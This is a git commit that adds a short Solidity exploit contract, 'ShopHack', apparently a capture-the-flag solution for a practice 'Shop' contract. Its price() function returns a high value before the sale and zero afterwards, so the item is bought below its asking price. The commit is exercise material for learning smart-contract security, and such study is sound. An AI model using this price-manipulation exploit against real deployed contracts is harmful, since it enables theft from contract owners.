debef524bbd1e6377a6eac5d61c60d0fee784d46
InfoSecSheep <plaguecrafter@lavabit.com>
2023-03-05 15:37:38 +0200

    added shop hack

---
+++ src/21-Shop/ShopHack.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+import "./Shop.sol";
+
+contract ShopHack {
+    Shop shop;
+
+    constructor(Shop _shop) {
+        shop = _shop;
+    }
+
+    function price() external view returns (uint256) {
+        return !shop.isSold() ? 100 : 0;
+    }
+
+    function attack() external {
+        shop.buy();
+    }
+}
